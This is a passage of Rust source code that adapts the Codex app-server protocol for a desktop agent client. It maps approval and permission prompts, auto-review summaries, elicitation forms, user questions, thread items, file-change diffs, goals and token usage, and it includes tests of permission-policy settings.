            params.get("itemId").and_then(Value::as_str),
            params.get("delta").and_then(Value::as_str),
        ) {
            self.events
                .emit(AgentEvent::Delta {
                    item_id: item_id.into(),
                    kind,
                    text: text.into(),
                })
                .await;
        }
    }
}

fn approval_choices(
    method: &str,
    params: &Value,
) -> (Vec<ApprovalOption>, HashMap<String, Value>, Value) {
    if method == "item/permissions/requestApproval" {
        let mut permissions = params.get("permissions").cloned().unwrap_or(json!({}));
        if let Some(fields) = permissions.as_object_mut() {
            fields.retain(|_, value| !value.is_null());
        }
        let mut choices = Vec::new();
        let mut replies = HashMap::new();
        for (id, label, kind, permissions, scope) in [
            (
                "turn",
                "Grant for this turn",
                ApprovalOptionKind::AllowOnce,
                permissions.clone(),
                "turn",
            ),
            (
                "session",
                "Grant for this session",
                ApprovalOptionKind::AllowAlways,
                permissions,
                "session",
            ),
            (
                "decline",
                "Decline",
                ApprovalOptionKind::RejectOnce,
                json!({}),
                "turn",
            ),
        ] {
            choices.push(ApprovalOption {
                id: id.into(),
                label: label.into(),
                kind,
            });
            replies.insert(id.into(), json!({"permissions":permissions, "scope":scope}));
        }
        return (choices, replies, json!({"permissions":{}, "scope":"turn"}));
    }
    let legacy = matches!(method, "execCommandApproval" | "applyPatchApproval");
    let defaults = if legacy {
        json!(["approved", "approved_for_session", "denied", "abort"])
    } else {
        json!(["accept", "acceptForSession", "decline", "cancel"])
    };
    let decisions = params
        .get("availableDecisions")
        .and_then(Value::as_array)
        .unwrap_or(defaults.as_array().expect("decision array"));
    let mut options = Vec::new();
    let mut replies = HashMap::new();
    for (index, decision) in decisions.iter().enumerate() {
        let (id, label, kind) = match decision.as_str() {
            Some("accept" | "approved") => (
                decision.as_str().unwrap().to_owned(),
                "Allow once",
                ApprovalOptionKind::AllowOnce,
            ),
            Some("acceptForSession" | "approved_for_session") => (
                decision.as_str().unwrap().to_owned(),
                "Allow for this session",
                ApprovalOptionKind::AllowAlways,
            ),
            Some("decline" | "denied") => (
                decision.as_str().unwrap().to_owned(),
                "Decline",
                ApprovalOptionKind::RejectOnce,
            ),
            Some("cancel" | "abort") => continue,
            _ if decision.get("acceptWithExecpolicyAmendment").is_some() => (
                format!("decision:{index}"),
                "Allow and remember this command",
                ApprovalOptionKind::AllowAlways,
            ),
            _ if decision.get("applyNetworkPolicyAmendment").is_some() => {
                let deny = decision
                    .pointer("/applyNetworkPolicyAmendment/network_policy_amendment/action")
                    .and_then(Value::as_str)
                    == Some("deny");
                (
                    format!("decision:{index}"),
                    if deny {
                        "Deny this host"
                    } else {
                        "Allow this host"
                    },
                    if deny {
                        ApprovalOptionKind::RejectAlways
                    } else {
                        ApprovalOptionKind::AllowAlways
                    },
                )
            }
            _ => continue,
        };
        options.push(ApprovalOption {
            id: id.clone(),
            label: label.into(),
            kind,
        });
        replies.insert(id, json!({"decision":decision}));
    }
    (
        options,
        replies,
        json!({"decision":if legacy { "abort" } else { "cancel" }}),
    )
}

fn auto_review_action_summary(action: &Value) -> String {
    match action.get("type").and_then(Value::as_str) {
        Some("command") => format!(
            "Command: {}",
            shell_script(&string_field(action, "command"))
        ),
        Some("execve") => {
            let mut command = vec![string_field(action, "program")];
            command.extend(strings(action.get("argv")));
            format!("Command: {}", command.join(" "))
        }
        Some("writeStdin") => format!(
            "Input to process {}: {}",
            string_field(action, "processId"),
            string_field(action, "stdin")
        ),
        Some("applyPatch") => format!("Patch files: {}", strings(action.get("files")).join(", ")),
        Some("networkAccess") => format!(
            "Network target: {} ({}:{} via {})",
            string_field(action, "target"),
            string_field(action, "host"),
            action
                .get("port")
                .and_then(Value::as_u64)
                .unwrap_or_default(),
            string_field(action, "protocol")
        ),
        Some("mcpToolCall") => format!(
            "MCP tool: {}/{}",
            string_field(action, "server"),
            string_field(action, "toolName")
        ),
        Some("requestPermissions") => {
            let permissions = action.get("permissions").unwrap_or(&Value::Null);
            let mut requested = Vec::new();
            if let Some(enabled) = permissions
                .pointer("/network/enabled")
                .and_then(Value::as_bool)
            {
                requested.push(if enabled {
                    "network access".into()
                } else {
                    "no network access".into()
                });
            }
            if let Some(files) = permissions.get("fileSystem") {
                for (key, label) in [("read", "read"), ("write", "write")] {
                    let paths = strings(files.get(key));
                    if !paths.is_empty() {
                        requested.push(format!("{label}: {}", paths.join(", ")));
                    }
                }
                for entry in files
                    .get("entries")
                    .and_then(Value::as_array)
                    .into_iter()
                    .flatten()
                {
                    let path = entry.get("path").unwrap_or(&Value::Null);
                    let path = path
                        .get("path")
                        .or_else(|| path.get("pattern"))
                        .or_else(|| path.pointer("/value/kind"))
                        .and_then(Value::as_str)
                        .unwrap_or("configured path");
                    requested.push(format!("{}: {path}", string_field(entry, "access")));
                }
            }
            let reason = action
                .get("reason")
                .and_then(Value::as_str)
                .filter(|reason| !reason.is_empty())
                .map(|reason| format!(" ({reason})"))
                .unwrap_or_default();
            format!(
                "Requested permissions: {}{reason}",
                if requested.is_empty() {
                    "none specified".into()
                } else {
                    requested.join("; ")
                }
            )
        }
        _ => "Action under review".into(),
    }
}

fn guardian_event(params: &Value) -> Option<Value> {
    if let Some(event) = params.get("event").filter(|event| event.is_object()) {
        return Some(event.clone());
    }
    let review = params.get("review")?;
    let id = params.get("reviewId")?.as_str()?;
    let action = params.get("action")?;
    Some(json!({
        "id":id, "turn_id":params.get("turnId"), "target_item_id":params.get("targetItemId"),
        "started_at_ms":params.get("startedAtMs"), "completed_at_ms":params.get("completedAtMs"),
        "status":snake_case(review.get("status")?.as_str()?), "risk_level":review.get("riskLevel"),
        "user_authorization":review.get("userAuthorization"), "rationale":review.get("rationale"),
        "decision_source":params.get("decisionSource"), "action":native_guardian_value(action),
    }))
}

fn native_guardian_value(value: &Value) -> Value {
    match value {
        Value::Object(fields) => Value::Object(
            fields
                .iter()
                .map(|(key, value)| {
                    let value = if matches!(key.as_str(), "type" | "source")
                        && let Some(value) = value.as_str()
                    {
                        json!(snake_case(value))
                    } else {
                        native_guardian_value(value)
                    };
                    (snake_case(key), value)
                })
                .collect(),
        ),
        Value::Array(values) => Value::Array(values.iter().map(native_guardian_value).collect()),
        _ => value.clone(),
    }
}

fn snake_case(value: &str) -> String {
    let mut result = String::new();
    for c in value.chars() {
        if c.is_ascii_uppercase() {
            result.push('_');
            result.push(c.to_ascii_lowercase());
        } else {
            result.push(c);
        }
    }
    result
}

fn workspace_files(attachments: &[Attachment]) -> Vec<&str> {
    attachments.iter().filter_map(Attachment::workspace_file).collect()
}

fn add_file_context(params: &mut Value, paths: &[&str]) {
    // Codex limits individual context values. Send one verified file path per
    // entry; application instructions may already occupy other entries.
    let message = uuid::Uuid::new_v4().simple();
    for (i, path) in paths.iter().enumerate() {
        params["additionalContext"][format!("muteki_{message}_{i}")] =
            json!({"kind":"untrusted","name":"muteki_attachment","value":path});
    }
}

/// The `input: UserInput[]` array shared by `turn/start` and `turn/steer`: text
/// first, then one `image` entry per attachment carrying a
/// `data:<mime>;base64,<data>` URL (the Codex app-server image-input shape).
fn user_input(text: &str, attachments: &[Attachment]) -> Value {
    let mut input = vec![json!({ "type": "text", "text": text, "text_elements": [] })];
    for attachment in attachments.iter().filter(|attachment| attachment.workspace_file().is_none()) {
        input.push(json!({
            "type": "image",
            "url": format!("data:{};base64,{}", attachment.media_type, attachment.data_base64),
        }));
    }
    Value::Array(input)
}

/// The text parts of a `userMessage` item's `content: UserInput[]`, joined in
/// order; mirrors what [`user_input`] sent so a steer echo compares equal.
fn user_message_text(item: &Value) -> String {
    item.get("content")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter(|part| part.get("type").and_then(Value::as_str) == Some("text"))
        .filter_map(|part| part.get("text").and_then(Value::as_str))
        .collect()
}

fn pending_name(request: Option<&PendingRequest>) -> &'static str {
    match request {
        Some(PendingRequest::Operation{..})=>"runtime operation",
        Some(PendingRequest::RewindApply{..})=>"thread/revert",
        Some(PendingRequest::TurnStart { .. }) => "turn/start",
        Some(PendingRequest::Interrupt) => "turn/interrupt",
        Some(PendingRequest::Steer { .. }) => "turn/steer",
        Some(PendingRequest::SubagentMetadata { .. }) => "thread/read",
        Some(PendingRequest::GuardianApproval { .. }) => "thread/approveGuardianDeniedAction",
        Some(PendingRequest::InjectItems | PendingRequest::AttachmentContext { .. }) => "thread/inject_items",
        Some(PendingRequest::Compact) => "thread/compact/start",
        Some(PendingRequest::GoalChange) => "thread/goal",
        Some(PendingRequest::GoalSnapshot) => "thread/goal/get",
        None => "unknown",
    }
}

fn request_id_string(id: &Value) -> String {
    id.as_str()
        .map(str::to_owned)
        .unwrap_or_else(|| id.to_string())
}

/// Normalize a canonical answer value into the wire array shape. A single
/// string becomes a 1-element array; an array of strings is kept; anything
/// else yields an empty array.
fn strings(value: Option<&Value>) -> Vec<String> {
    let Some(value) = value else {
        return Vec::new();
    };
    match value {
        Value::String(s) => vec![s.clone()],
        Value::Array(items) => items
            .iter()
            .filter_map(|v| v.as_str().map(str::to_owned))
            .collect(),
        _ => Vec::new(),
    }
}

fn non_empty_string(value: &Value) -> Option<String> {
    strings(Some(value))
        .into_iter()
        .find(|answer| !answer.is_empty())
}

fn elicitation_result(fields: &[ElicitField], answers: &serde_json::Map<String, Value>) -> Value {
    if let Some(action)=answers.get("$muteki_action").and_then(Value::as_str){return json!({"action":action});}
    if fields.len() == 1 && matches!(fields[0].kind, ElicitFieldKind::UrlAck) {
        let action = answers
            .get(&fields[0].key)
            .and_then(non_empty_string)
            .filter(|answer| answer != ELICITATION_URL_CANCEL_LABEL)
            .map_or("cancel", |_| "accept");
        return json!({ "action": action });
    }

    let mut content = serde_json::Map::new();
    for field in fields {
        let Some(answer) = answers.get(&field.key) else {
            continue;
        };
        let value = match field.kind {
            ElicitFieldKind::Typed => Some(answer.clone()),
            ElicitFieldKind::UrlAck => None,
        };
        if let Some(value) = value {
            content.insert(field.key.clone(), value);
        }
    }

    json!({ "action": "accept", "content": content })
}

fn elicit_option(label: &str) -> UserInputOption {
    UserInputOption {
        label: label.to_owned(),
        description: String::new(),
    }
}

fn parse_elicitation_form(params:&Value,server_name:&str)->Option<(Vec<UserInputQuestion>,Vec<ElicitField>)>{
    let schema=params.get("requestedSchema")?;
    let properties=schema["properties"].as_object()?;
    let mut questions=crate::acp::form_questions(schema,params["message"].as_str().unwrap_or(""));
    if !properties.is_empty()&&questions.len()!=properties.len(){return None;}
    for question in &mut questions {question.header=format!("{server_name}: {}",question.header);}
    let fields=properties.keys().map(|key|ElicitField{key:key.clone(),kind:ElicitFieldKind::Typed}).collect();
    Some((questions,fields))
}

fn parse_elicitation_url(
    params: &Value,
    server_name: &str,
) -> (Vec<UserInputQuestion>, Vec<ElicitField>) {
    let message = params
        .get("message")
        .and_then(Value::as_str)
        .unwrap_or_default();
    let url = params
        .get("url")
        .and_then(Value::as_str)
        .unwrap_or_default();
    // The agent crate has no window handle, so keep the URL visible and
    // selectable in the question panel instead of attempting to open it.
    let question = UserInputQuestion { contract: Some(json!({"kind":"single_select","required":true,"allow_free_text":false,"elicitation":true})),
        id: "url".into(),
        header: format!("{server_name}: open link"),
        question: format!("{message}\n\n{url}"),
        options: vec![
            elicit_option(ELICITATION_URL_ACK_LABEL),
            elicit_option(ELICITATION_URL_CANCEL_LABEL),
        ],
        multi_select: false,
        prefill: None,
    };
    let field = ElicitField {
        key: "url".into(),
        kind: ElicitFieldKind::UrlAck,
    };
    (vec![question], vec![field])
}

/// Map an `item/tool/requestUserInput` params object into canonical
/// [`UserInputQuestion`]s. Questions missing a non-empty `id`/`header`/`question`
/// are dropped, as are options with an empty label. Questions with zero options
/// remain available for free-text answers. `multiSelect` is forced false.
fn parse_codex_user_input(params: &Value) -> Vec<UserInputQuestion> {
    let questions = match params.get("questions").and_then(Value::as_array) {
        Some(q) => q,
        None => return Vec::new(),
    };
    questions
        .iter()
        .filter_map(|q| {
            let id = q
                .get("id")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())?;
            let header = q
                .get("header")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())?;
            let question = q
                .get("question")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())?;
            let options = q
                .get("options")
                .and_then(Value::as_array)
                .map(|opts| {
                    opts.iter()
                        .filter_map(|opt| {
                            let label = opt
                                .get("label")
                                .and_then(Value::as_str)
                                .filter(|s| !s.is_empty())?;
                            let description = opt
                                .get("description")
                                .and_then(Value::as_str)
                                .unwrap_or_default();
                            Some(UserInputOption {
                                label: label.to_owned(),
                                description: description.to_owned(),
                            })
                        })
                        .collect()
                })
                .unwrap_or_default();
            Some(UserInputQuestion { contract: crate::native_question_contract(q),
                id: id.to_owned(),
                header: header.to_owned(),
                question: question.to_owned(),
                options,
                multi_select: false,
                prefill: None,
            })
        })
        .collect()
}

/// Map a completed `agentMessage`'s `questions` (the `request_user_input_async`
/// tool's `{title, options?}` list) into canonical questions. The id is the
/// desktop app's `JSON.stringify([tool, message id, index])`, which is what
/// the reply envelope must echo back; the tool has no header. Questions with
/// an empty title and options with an empty label are dropped.
const ASYNC_QUESTION_TOOL: &str = "request_user_input_async";

fn has_async_questions(item: &Value) -> bool {
    item.get("questions")
        .and_then(Value::as_array)
        .is_some_and(|questions| !questions.is_empty())
}

fn parse_codex_async_questions(message_id: &str, item: &Value) -> Vec<UserInputQuestion> {
    let questions = match item.get("questions").and_then(Value::as_array) {
        Some(questions) => questions,
        None => return Vec::new(),
    };
    questions
        .iter()
        .enumerate()
        .filter_map(|(index, q)| {
            let title = q
                .get("title")
                .and_then(Value::as_str)
                .map(str::trim)
                .filter(|t| !t.is_empty())?;
            let options = strings(q.get("options"))
                .into_iter()
                .map(|label| label.trim().to_owned())
                .filter(|label| !label.is_empty())
                .map(|label| UserInputOption {
                    label,
                    description: String::new(),
                })
                .collect();
            Some(UserInputQuestion { contract: crate::native_question_contract(q),
                id: json!([ASYNC_QUESTION_TOOL, message_id, index]).to_string(),
                header: String::new(),
                question: title.to_owned(),
                options,
                multi_select: false,
                prefill: None,
            })
        })
        .collect()
}

/// Codex's `request_user_input_async` reply: the `<send_user_message_question_reply>`
/// envelope the desktop app and TUI send, listing each answered question with
/// its `questionItemId` so the model correlates the answer. Returns the wire
/// text and the plain `> question` / answer rendering the timeline shows, or
/// `None` when no question was answered. Question text is flattened to one
/// line and capped at 512 characters, as the TUI does.
fn async_question_reply(
    questions: &[UserInputQuestion],
    answers: &serde_json::Map<String, Value>,
) -> Option<(String, String)> {
    let mut replies = Vec::new();
    let mut display = Vec::new();
    for question in questions {
        let answer = strings(answers.get(&question.id)).join(", ");
        let answer = answer.trim();
        if answer.is_empty() {
            continue;
        }
        let title = question
            .question
            .chars()
            .take(512)
            .collect::<String>()
            .replace(['\n', '\r'], " ");
        replies.push(json!({
            "answer": answer,
            "question": title,
            "questionItemId": question.id,
        }));
        display.push(format!("> {title}\n\n{answer}"));
    }
    if replies.is_empty() {
        return None;
    }
    let wire = format!(
        "<send_user_message_question_reply>\n{}\n</send_user_message_question_reply>",
        Value::Array(replies)
    );
    Some((wire, display.join("\n\n")))
}

fn map_child_item(item: &Value) -> Option<ThreadItem> {
    if item["type"] != "userMessage" { return map_item(item); }
    Some(ThreadItem {
        id: item["id"].as_str()?.to_owned(),
        parent_item_id: None,
        content: ItemContent::UserMessage {
            text: user_message_text(item),
            context_len: None,
            attachments: item["content"].as_array().into_iter().flatten().filter_map(|part| {
                match part["type"].as_str() {
                    Some("localImage") => part["path"].as_str(),
                    Some("image") => part["url"].as_str(),
                    _ => None,
                }
            }).map(str::to_owned).collect(),
        },
    })
}

fn map_item(item: &Value) -> Option<ThreadItem> {
    let id = item.get("id").and_then(Value::as_str)?.to_owned();
    let provider_kind = item
        .get("type")
        .and_then(Value::as_str)
        .unwrap_or("unknown");
    // The app synthesizes a canonical `UserMessage` event at send time (needed
    // for universal replay across providers). Codex echoes the same user input
    // back as a `userMessage` item; emitting it too would render a duplicate
    // user bubble, so swallow the provider echo here.
    if provider_kind == "userMessage" {
        log::debug!("suppressing provider-echoed userMessage item {id}");
        return None;
    }
    let content = match provider_kind {
        // `request_user_input_async` output: the text only lists the questions
        // the input panel shows, so the transcript records the tool call.
        "agentMessage" if has_async_questions(item) => ItemContent::ToolCall {
            presentation: None,
            image_reads: Vec::new(),
            name: ASYNC_QUESTION_TOOL.into(),
            input: json!({ "questions": item.get("questions").cloned().unwrap_or_default() }),
            output: None,
            status: ItemStatus::Completed,
        },
        "agentMessage" | "plan" | "proposed_plan" => ItemContent::AssistantMessage {
            text: string_field(item, "text"),
        },
        "reasoning" => {
            let mut parts = strings(item.get("summary"));
            parts.extend(strings(item.get("content")));
            ItemContent::Reasoning {
                text: parts.join("\n"),
            }
        }
        "commandExecution" => ItemContent::CommandExecution {
            command: shell_script(&string_field(item, "command")),
            output: string_field(item, "aggregatedOutput"),
            exit_code: item
                .get("exitCode")
                .and_then(Value::as_i64)
                .and_then(|n| i32::try_from(n).ok()),
            status: map_status(item.get("status").and_then(Value::as_str)),
        },
        "fileChange" => ItemContent::FileChange {
            changes: item
                .get("changes")
                .and_then(Value::as_array)
                .map(|changes| changes.iter().filter_map(map_file_change).collect())
                .unwrap_or_default(),
            status: map_status(item.get("status").and_then(Value::as_str)),
        },
        "mcpToolCall" | "dynamicToolCall" => ItemContent::ToolCall {
            presentation: None,
            image_reads: if item.get("status").and_then(Value::as_str) == Some("completed")
                && item.get("error").is_none_or(Value::is_null)
                && item.get("success").and_then(Value::as_bool) != Some(false)
                && item.pointer("/result/isError").and_then(Value::as_bool) != Some(true)
                && crate::image_reads::is_read_tool(&string_field(item, "tool"))
            {
                crate::image_reads::content_images(
                    item.pointer("/result/content")
                        .or_else(|| item.get("contentItems"))
                        .unwrap_or(&Value::Null),
                )
            } else {
                Vec::new()
            },
            name: if provider_kind == "mcpToolCall" {
                format!(
                    "{}/{}",
                    string_field(item, "server"),
                    string_field(item, "tool")
                )
            } else {
                string_field(item, "tool")
            },
            input: item.get("arguments").cloned().unwrap_or(Value::Null),
            output: if provider_kind == "mcpToolCall" {
                tool_output(item)
            } else {
                item.get("contentItems")
                    .filter(|v| !v.is_null())
                    .map(Value::to_string)
            },
            status: map_status(item.get("status").and_then(Value::as_str)),
        },
        "collabAgentToolCall" => ItemContent::ToolCall {
            presentation: None,
            image_reads: Vec::new(),
            name: string_field(item, "tool"),
            input: collab_tool_input(item),
            output: item
                .get("agentsStates")
                .and_then(Value::as_object)
                .filter(|states| !states.is_empty())
                .map(|_| item["agentsStates"].to_string()),
            status: map_status(item.get("status").and_then(Value::as_str)),
        },
        "imageView" => ItemContent::ImageRead {
            path: string_field(item, "path"),
            image: None,
        },
        "webSearch" => ItemContent::WebSearch {
            query: string_field(item, "query"),
        },
        _ => ItemContent::Other {
            provider_kind: provider_kind.into(),
            summary: serde_json::to_string(item).unwrap_or_else(|_| provider_kind.into()),
        },
    };
    Some(ThreadItem {
        id,
        parent_item_id: None,
        content,
    })
}

fn collab_tool_input(item: &Value) -> Value {
    let mut input = serde_json::Map::new();
    for key in [
        "senderThreadId",
        "receiverThreadIds",
        "prompt",
        "model",
        "reasoningEffort",
    ] {
        if let Some(value) = item.get(key).filter(|value| !value.is_null()) {
            input.insert(key.to_owned(), value.clone());
        }
    }
    let summary = item
        .get("prompt")
        .and_then(Value::as_str)
        .filter(|prompt| !prompt.is_empty())
        .map(str::to_owned)
        .or_else(|| {
            item.get("receiverThreadIds")
                .and_then(Value::as_array)
                .map(|ids| {
                    ids.iter()
                        .filter_map(Value::as_str)
                        .collect::<Vec<_>>()
                        .join(", ")
                })
                .filter(|ids| !ids.is_empty())
        });
    if let Some(summary) = summary {
        input.insert("summary".into(), Value::String(summary));
    }
    Value::Object(input)
}

fn find_subagent_activity(value: &Value) -> Option<&Value> {
    if let Some(item) = value
        .get("item")
        .filter(|item| item.get("type").and_then(Value::as_str) == Some("subAgentActivity"))
    {
        return Some(item);
    }
    value
        .pointer("/event/payload")
        .filter(|payload| payload.get("type").and_then(Value::as_str) == Some("sub_agent_activity"))
}

fn item_status(content: &ItemContent) -> ItemStatus {
    match content {
        ItemContent::CommandExecution { status, .. }
        | ItemContent::FileChange { status, .. }
        | ItemContent::ToolCall { status, .. }
        | ItemContent::Subagent { status, .. } => *status,
        _ => ItemStatus::Completed,
    }
}

fn item_summary(content: &ItemContent) -> Option<String> {
    match content {
        ItemContent::ToolCall { output, .. } => output
            .as_deref()
            .map(|text| text.split_whitespace().collect::<Vec<_>>().join(" ")),
        _ => None,
    }
}

/// Codex runs every command through the user's login shell and reports the
/// whole argv, shell-quoted: `/bin/zsh -lc 'sed -n 1,2p hosts'`. Its own TUI
/// shows the script alone, so that is what Tcode surfaces; anything else is
/// left as reported.
fn shell_script(command: &str) -> String {
    let Ok(argv) = shell_words::split(command) else {
        return command.to_owned();
    };
    match argv.as_slice() {
        [shell, flag, script]
            if flag == "-lc"
                && matches!(
                    std::path::Path::new(shell)
                        .file_name()
                        .and_then(|name| name.to_str()),
                    Some("bash" | "zsh" | "sh")
                ) =>
        {
            script.clone()
        }
        _ => command.to_owned(),
    }
}

fn string_field(value: &Value, field: &str) -> String {
    value
        .get(field)
        .and_then(Value::as_str)
        .unwrap_or_default()
        .to_owned()
}

fn notification_turn_id(params: &Value, active_turn: &Option<String>) -> Option<String> {
    params
        .get("turnId")
        .and_then(Value::as_str)
        .map(str::to_owned)
        .or_else(|| active_turn.clone())
}

fn tool_output(item: &Value) -> Option<String> {
    if let Some(message) = item.pointer("/error/message").and_then(Value::as_str) {
        return Some(message.into());
    }
    item.get("result")
        .filter(|v| !v.is_null())
        .map(Value::to_string)
}

/// Map one `turn/plan/updated` step, falling back to `pending` status and
/// `"step"` text when those fields are absent or unusable.
/// A `ThreadGoal`; `null` (no goal) maps to `None`.
fn map_goal(goal: &Value) -> Option<Goal> {
    let status = match goal.get("status")?.as_str()? {
        "active" => GoalStatus::Active,
        "paused" => GoalStatus::Paused,
        "blocked" => GoalStatus::Blocked,
        "usageLimited" => GoalStatus::UsageLimited,
        "budgetLimited" => GoalStatus::BudgetLimited,
        "complete" => GoalStatus::Complete,
        _ => return None,
    };
    let count = |field: &str| goal.get(field).and_then(Value::as_u64);
    Some(Goal {
        objective: goal.get("objective")?.as_str()?.to_owned(),
        status,
        tokens_used: count("tokensUsed"),
        token_budget: count("tokenBudget"),
        time_used_secs: count("timeUsedSeconds"),
        checks: None,
        last_check: None,
    })
}

fn goal_status_wire(status: GoalStatus) -> &'static str {
    match status {
        GoalStatus::Active => "active",
        GoalStatus::Paused => "paused",
        GoalStatus::Blocked => "blocked",
        GoalStatus::UsageLimited => "usageLimited",
        GoalStatus::BudgetLimited => "budgetLimited",
        GoalStatus::Complete => "complete",
    }
}

fn map_plan_step(step: &Value) -> PlanStep {
    let text = step
        .get("step")
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .unwrap_or("step")
        .to_owned();
    let status = match step.get("status").and_then(Value::as_str) {
        Some("completed") => PlanStepStatus::Completed,
        Some("inProgress") => PlanStepStatus::InProgress,
        _ => PlanStepStatus::Pending,
    };
    PlanStep { step: text, status }
}

fn map_status(status: Option<&str>) -> ItemStatus {
    match status {
        Some("completed") => ItemStatus::Completed,
        Some("failed") => ItemStatus::Failed,
        Some("interrupted") => ItemStatus::Interrupted,
        Some("declined") => ItemStatus::Declined,
        _ => ItemStatus::InProgress,
    }
}

fn map_file_change(change: &Value) -> Option<FileChange> {
    let kind_value = change.get("kind").unwrap_or(&Value::Null);
    let kind_type = kind_value
        .get("type")
        .and_then(Value::as_str)
        .or_else(|| kind_value.as_str())
        .unwrap_or("update");
    let kind = match kind_type {
        "add" | "create" => FileChangeKind::Create,
        "delete" => FileChangeKind::Delete,
        "update"
            if kind_value
                .get("move_path")
                .or_else(|| kind_value.get("movePath"))
                .is_some_and(|v| !v.is_null()) =>
        {
            FileChangeKind::Rename
        }
        _ => FileChangeKind::Modify,
    };
    let mut change = FileChange {
        path: change.get("path").and_then(Value::as_str)?.to_owned(),
        kind,
        diff: change
            .get("diff")
            .and_then(Value::as_str)
            .map(str::to_owned),
    };
    normalize_file_change_diff(&mut change);
    Some(change)
}

/// Decode file contents stored by the Codex adapter before it normalized add/delete diffs.
/// Only call this for unversioned Codex records; turn-wide snapshots already contain patches.
pub fn normalize_legacy_file_change_event(event: &mut AgentEvent) {
    let changes = match event {
        AgentEvent::ItemStarted(item)
        | AgentEvent::ItemUpdated(item)
        | AgentEvent::ItemCompleted(item) => {
            let ItemContent::FileChange { changes, .. } = &mut item.content else {
                return;
            };
            changes
        }
        AgentEvent::ApprovalRequested(request) => {
            let ApprovalKind::FileChange { changes, .. } = &mut request.kind else {
                return;
            };
            changes
        }
        _ => return,
    };
    for change in changes {
        normalize_file_change_diff(change);
    }
}

fn normalize_file_change_diff(change: &mut FileChange) {
    let sign = match change.kind {
        FileChangeKind::Create => '+',
        FileChangeKind::Delete => '-',
        _ => return,
    };
    let Some(content) = change.diff.as_ref().filter(|content| !content.is_empty()) else {
        return;
    };
    // Codex's add/delete `diff` is the complete file, even when that file itself looks like a patch.
    let lines = content.split_inclusive('\n').count();
    let mut patch = if sign == '+' {
        format!("@@ -0,0 +1,{lines} @@\n")
    } else {
        format!("@@ -1,{lines} +0,0 @@\n")
    };
    for line in content.split_inclusive('\n') {
        patch.push(sign);
        patch.push_str(line);
    }
    if !content.ends_with('\n') {
        patch.push_str("\n\\ No newline at end of file\n");
    }
    change.diff = Some(patch);
}

fn map_usage(value: &Value) -> Option<TokenUsage> {
    let last = value.get("last")?;
    // The session-cumulative running total lives in a sibling `total` object.
    let total_processed_tokens = value.pointer("/total/totalTokens").and_then(Value::as_u64);
    Some(TokenUsage {
        freshness: crate::ContextFreshness::Current,
        context_window: value.get("modelContextWindow").and_then(Value::as_u64),
        total_processed_tokens,
        input_tokens: last.get("inputTokens").and_then(Value::as_u64),
        cached_input_tokens: last.get("cachedInputTokens").and_then(Value::as_u64),
        reasoning_tokens: last.get("reasoningOutputTokens").and_then(Value::as_u64),
        output_tokens: last.get("outputTokens").and_then(Value::as_u64),
        used_tokens: last.get("totalTokens").and_then(Value::as_u64),
        ..TokenUsage::default()
    })
}

fn model_reroute(params: &Value) -> Option<(String, Option<String>)> {
    let to = params
        .get("toModel")
        .or_else(|| params.get("to_model"))
        .and_then(Value::as_str)?
        .to_owned();
    let reason = params
        .get("reason")
        .and_then(Value::as_str)
        .map(str::to_owned);
    Some((to, reason))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn native_permissions_apply_and_confirm_on_next_turn() {
        smol::block_on(async {
            for (value, policy, reviewer, sandbox) in [
                ("ask", "on-request", "user", Some("workspaceWrite")),
                (
                    "auto_review",
                    "on-request",
                    "auto_review",
                    Some("workspaceWrite"),
                ),
                ("read_only", "on-request", "user", Some("readOnly")),
                ("full_access", "never", "user", Some("dangerFullAccess")),
                ("profile:restricted", "on-request", "user", None),
            ] {
                let (mut actor, events) = test_actor();
                actor.permission_descriptor = permission_descriptor(
                    &[
                        json!({"id":"restricted","description":"Custom workspace rules","allowed":true}),
                    ],
                    "ask",
                    &Value::Null,
                );
                actor
                    .handle_command(SessionCommand::SetOption {
                        id: "permissions".into(),
                        value: json!(value),
                    })
                    .await
                    .unwrap();
                assert!(
                    events.try_recv().is_err(),
                    "requested permission must remain pending"
                );
                actor
                    .handle_command(SessionCommand::SendTurn {
                        delivery_id: 7,
                        text: "hello".into(),
                        options: None,
                        attachments: Vec::new(),
                    })
                    .await
                    .unwrap();
                assert!(matches!(
                    events.recv().await.unwrap(),
                    AgentEvent::TurnAccepted { delivery_id: 7 }
                ));
                let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
                    panic!("native request")
                };
                let request: Value = serde_json::from_str(&line).unwrap();
                assert_eq!(request["method"], "turn/start");
                assert_eq!(request["params"]["approvalPolicy"], policy);
                assert_eq!(request["params"]["approvalsReviewer"], reviewer);
                if let Some(sandbox) = sandbox {
                    assert_eq!(request["params"]["sandboxPolicy"]["type"], sandbox);
                    assert!(request["params"].get("permissions").is_none());
                } else {
                    assert_eq!(request["params"]["permissions"], "restricted");
                    assert!(request["params"].get("sandboxPolicy").is_none());
                }
                let settings = if let Some(sandbox) = sandbox {
                    json!({"approvalPolicy":policy,"approvalsReviewer":reviewer,
                        "sandboxPolicy":{"type":sandbox}})
                } else {
                    json!({"approvalPolicy":policy,"approvalsReviewer":reviewer,
                        "activePermissionProfile":{"id":"restricted"}})
                };
                actor
                    .handle_line(
                        &json!({"method":"thread/settings/updated", "params":{
                            "threadId":"thread-1", "threadSettings":settings
                        }})
                        .to_string(),
                    )
                    .await;
                assert!(
                    events.try_recv().is_err(),
                    "a settings notification before the turn/start reply must keep permission pending"
                );
                actor
                    .handle_line(
                        &json!({"id":request["id"], "result":{"turn":{"id":"turn-accepted"}}})
                            .to_string(),
                    )
                    .await;
                assert!(
                    matches!(events.recv().await.unwrap(), AgentEvent::ProviderOptions { selections, .. } if selections == vec![OptionSelection {id:"permissions".into(),value:json!(value)}])
                );
                let _ = actor.child.kill();
                let _ = actor.child.wait();
            }
        });
    }

    #[test]
    fn permission_profile_list_uses_cwd_and_preserves_availability() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            let (tx, rx) = smol::channel::unbounded();
            tx.send(ChildOutput::Line(
                json!({"id":3,"result":{"data":[
                {"id":":workspace","description":null,"allowed":true},
                {"id":"restricted","description":"Only this workspace","allowed":true},
                {"id":"blocked","description":null,"allowed":false}
            ],"nextCursor":null}})
                .to_string(),
            ))
            .await
            .unwrap();
            let profiles =
                request_permission_profiles(Path::new("/workspace"), &mut actor.stdin, &rx, &mut 3)
                    .await
                    .unwrap();
